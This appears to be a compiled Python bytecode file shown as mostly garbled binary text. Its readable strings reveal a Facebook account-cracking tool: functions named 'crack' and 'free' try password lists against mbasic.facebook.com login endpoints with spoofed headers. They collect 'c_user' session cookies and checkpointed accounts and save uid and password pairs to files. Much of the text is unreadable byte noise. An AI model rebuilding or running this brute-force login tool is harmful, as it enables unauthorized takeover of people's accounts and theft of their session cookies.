zCP/rB   r�   �c_user�;c                 �"   � g | ]\  }}|�d |����

S ��=rG   ��.0�key�values      rI   �

<listcomp>zcrack.<locals>.<listcomp>  �'   � �a�a�a�:�3��3�3�3���.�a�a�arH   �

[1;32mUid/Number: �2

Status    : Successful

[1;36mCookie    : [1;35m� - �%s

�   �/rh   �choice�u�k�kk�b�h�hh�looprf   re   �sys�stdout�write�ok�cp�flush�ugen�ugen2�requests�Sessionr�   �headers�update�get�text�re�search�str�group�post�cookies�get_dict�keysr

   rQ   rS   r�   �akunrV   �join�itemsr�   �

exceptions�ConnectionError�time�sleep�r�   r�   �bi�pers�fff�ua�ua2�ses�pw�p�dataa�po�coki�wrts                 rI   r�   r�   �   s  � ��m�Q�q��A�a��O�$�$���S���S�����

�������2�2�2�d�d�d�3�s�8�8�8�8�TW�XZ�T[�T[�T[�T[�\^�\^�\^�_�`�`�a�a���������m�D����

�}�U���������� � �R��

���

�

�2��;���.�3�\_�  jJ�  QT�  hu�  GT�  fl�  ~E�  Wa�  lE�  Xj�  }Y	�  Z	�  Z	�  [	�  [	�  [	�

�w�w�I�#�M�  OG�  G�  H�  H�  M�1���5�s�1�v�v�>�>�D�D�Q�G�G�RT�R[�\z�|�  AB�  }C�  }C�  SD�  SD�  SJ�  SJ�  KL�  SM�  SM�  TW�  _m�  uw�  k�  l�  l�5��;���.�{�gj�  uM�  ]@�  NP�  Zz�  N[�  mz�  LR�  dk�  }G	�  R	L

�  M

P

�  R	P

�  Q

I�  R	I�  \n�  A]�  ^�  ^�  _�  _�  _����f�lq�  CH��  	I�  	I�2��b�j�)�)�+�+�0�0�2�2�2� 

���F�B�	�$�u�*�/�

/��C���

8�9I�

I�#�b�'�'�

Q�Rn�

n�ot�

t�u�u�u���s��3�����c�#�g�b�j��o�.�.�.��K�K��C���

����	�E��C�K�(�(�*�*�/�/�1�1�1� 



�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�$�u�*�/�

/��C���

8�9I�

I�#�b�'�'�

Q�  SO�  O�  PT�  T�  UY�  Y�  Z_�  _�  `�  `�  `��s�s�2�2�

�C��I�I�c�N�N�N���S�M�M������%�%�%�	�E� 

��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �!G&P6�

D(P6�6(Q"�!Q"c                 ��  � t          j        t          t          t          t

          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          j        �

                    d|�dt          �dt          t          �  �        �dt          t          �  �        �dt          �d��  �        f t          j        �                    �   �          t          j        t"          �  �        }t          j        t$          �  �        }t'          j        �   �         }|D �]9}	 |�                    �   �         }|j        �                    d	d

|dd

dd

ddddddd�

�  �         |�                    d| z   dz   �  �        j        }	t5          j        dt9          |	�  �        �  �        �                    d�  �        t5          j        dt9          |	�  �        �  �        �                    d�  �        | d|dd�}

|j        �                    d	dd

dd|ddd

dddd| z   dz   ddd ��  �         |�                    d!|

d"�#�  �        }d$|j        �                     �   �         �!                    �   �         v r�tE          d%tF          z   d&z   t9          | �  �        z   d'z   t9          |�  �        z   d(z   tF          z   �  �         tI          tJ          d)�  �        �

                    | d*z   |z   d%z   �  �         tL          �'                    | d*z   |z   �  �          �n[d+|j        �                     �   �         �!                    �   �         v r�|j        �                     �   �         }d,�(                    d-� |j        �                     �   �         �)                    �   �         D �   �         �  �        }tE          d%tF          z   d.z   t9          | �  �        z   d'z   t9          |�  �        z   d/z   |z   d%z   tF          z   �  �         | �d0|��}

t          �'                    |

�  �         tI          tT          d)�  �        �

                    d1|

z  �  �          n1��# t&          j+        j,        $ r t[          j.        d2�  �         Y ��7w xY wt          dz

  ad S )3Nr�   r�   r�   r�   r�   r�   r�   r�   zmbasic.facebook.comr,   r�   r�   r�   r�   r�   r�   zhttps://mbasic.facebook.com/r�   r�   r�   z=https://mbasic.facebook.com/login/device-based/password/?uid=r�   r�   r   r�   r�   z/https://mbasic.facebook.com/login/save-device/'r�   r�   zhttps://mbasic.facebook.comr�   r�   zXhttps://mbasic.facebook.com/login/device-based/vnisaddate-password/?shbl=0&locale2=id_IDFr�   r�   r�   r�   r�   r�   rB   r�   r�   r�   c                 �"   � g | ]\  }}|�d |����

S r�   rG   r�   s      rI   r�   zfree.<locals>.<listcomp>.  r�   rH   r�   r�   r�   r�   r�   r�   r  s                 rI   rc   rc     s  � ��m�Q�q��A�a��O�$�$���S���S�����

�������2�2�2�d�d�d�3�s�8�8�8�8�TW�XZ�T[�T[�T[�T[�\^�\^�\^�_�`�`�a�a���������m�D����

�}�U���������� � �R��

���

�

�2��;���3�PS�ad�  oO�  VY�  mz�  LY�  kq�  CJ�  \f�  qO�  bt�  G	c	�  d	�  d	�  e	�  e	�  e	�

�w�w�N�s�R�  TL�  L�  M�  M�  R�1���5�s�1�v�v�>�>�D�D�Q�G�G�RT�R[�\z�|�  AB�  }C�  }C�  SD�  SD�  SJ�  SJ�  KL�  SM�  SM�  TW�  _m�  uw�  p�  q�  q�5��;���3�K�lo�  zW�  gJ�  XZ�  dD�  Xe�  wD�  V\�  nu�  G	Q	�  \	[

�  \

_

�  \	_

�  `

X�  \	X�  k}�  Pl�  m�  m�  n�  n�  n����k�qv�  HM��  	N�  	N�2��b�j�)�)�+�+�0�0�2�2�2� 

�	�$�u�*�/�

/��C���

8�9I�

I�#�b�'�'�

Q�Rn�

n�ot�

t�u�u�u���S�M�M����C���

�4��(�(�(��K�K��C���

����	�E��C�K�(�(�*�*�/�/�1�1�1� 



�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�$�u�*�/�

/��C���

8�9I�

I�#�b�'�'�

Q�  SO�  O�  PT�  T�  UY�  Y�  Z_�  _�  `�  `�  `��s�s�2�2�

�C��I�I�c�N�N�N���S�M�M������%�%�%�	�E� 

��	�	�	,� � � ��:�b�>�>�>�>�>����� �q����s   �!GP)�=D(P)�)(Q�Q)f�W�R�G�Y�B�P�C�NrE   rF   r�   �ImportError�richr  r  rZ   �concurrent.futures�

concurrent�bs4r�   rh   �platform�base64�

subprocessr   �uuid�json�datetimer�   �

rich.tabler   �me�rich.consoler   �solr   �sopr�   r   �gp�

rich.panelr	   �nelr

   �cetak�

rich.markdownr   �mark�rich.columnsr   �col�urllib.parser

   r�   r�   rU   re   r�   r�   �oprekrk   �	lisensiku�	taplikasi�tokenkur�   �lisensikunir�   r�   �mkdir�xr�   r�   r�   r�   �Kr�   r�   r  �dic�dic2�now�day�tglr�   �month�bln�year�thnr�   r�   rS   rD   rL   rQ   rP   r]   rX   rl   rw   rx   r�   rc   rG   rH   rI   �<module>rG     s0  ����������������

�� 	�	�	�	� 	��	�*� � � �#�������� #� #� #�

���!�"�"�"�"�"�#����<�������� <� <� <�

����������A����<�

�+�+�+�+��� <� <� <��$�:�;�;�;�;�;�<������<����"�������� "� "� "�

��� �!�!�!�!�!�"������������ � � �

������������� 	�	�	�	� 

�

�

�

� ���� ���� 

�

�

�

� ���� 

�

�

�

� � � � � 1� 1� 1� 1� 1� 1� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� G� "� "� "� "� "� "� '� '� '� '� '� '� $� $� $� $� $� $� 9� 9� 9� 9� 9� 9� $� $� $� $� $� $� #� #� #� #� #� #� 

�

�

�

� � � � � � � *� *� *� *� *� *� '� '� '� '� '� '� � � � � � ���"�)�L��������$����?�@x�y�� Ne	�  Ne	�  Ne	��KM�b�QR�SU�VX�Y[�\^�_a�bd�eg�hj�Kj� I��3�t�D��v�i�	�'�#�k������	���&������ �t�t�������������������������G��&�U[�`i�ny�  @I�  OY�  _i�  j�  j��

�J�G��e�QW�]c�ir�  yD�  JS�  Yc�  is�  t�  t��������!��	�3�3�x� �$�$�&�&�,�-�-�/��������"��

�c�c�#�h�h��s��3�3�s�8�8�#�C�'���C���0��6��

�c�c�#�h�h��s��3�3�s�8�8�#�C�'���C���0��6�� ��S��

�

�

� ��S��

�

�

�� � �	� 	� 	�"��	��$

9� 

9� 

9� �  �  �B



� 



� 



�� � �:!� !� !�H(	� (	� (	�R%	� %	� %	�L ������s�   �+ �A�A�A �%B�2A7�6B�7B

�B�	B

�

B�B�B �B1�0B1�5B: �:C�C�(E9 �9E=�&F7 �7F;
